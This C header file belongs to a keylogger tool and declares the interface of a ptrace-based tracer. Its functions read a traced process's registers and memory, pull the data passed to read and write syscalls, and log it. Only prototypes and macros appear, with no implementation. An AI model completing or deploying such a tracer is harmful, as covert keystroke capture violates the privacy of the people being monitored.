#ifndef KEYLOGGER_TRACER_HPP
#define KEYLOGGER_TRACER_HPP

#include <sys/ptrace.h>
#include <sys/user.h>
#include <sys/syscall.h>
#include <fcntl.h>
#include <zconf.h>
#include <wait.h>
#include <ctype.h>

#include "parsing.hpp"


#define _offsetof(a, b) __builtin_offsetof(a,b)
#define get_reg(child, name) __get_reg(child, _offsetof(struct user, regs.name))

#define eax rax
#define orig_eax orig_rax
#define SYSCALL_write 1
#define SYSCALL_read 0

long __get_reg(pid_t child, int off);

long get_syscall_arg(pid_t child, int which);

char *read_memory(pid_t child, unsigned long addr, long len);

char *extract_write_string(pid_t traced_process, long length);

int wait_for_syscall(pid_t child);

int get_syscall(pid_t traced_process);

void find_data_to_log(char *memory, unsigned long len, FILE *fd);

#endif //KEYLOGGER_TRACER_HPP
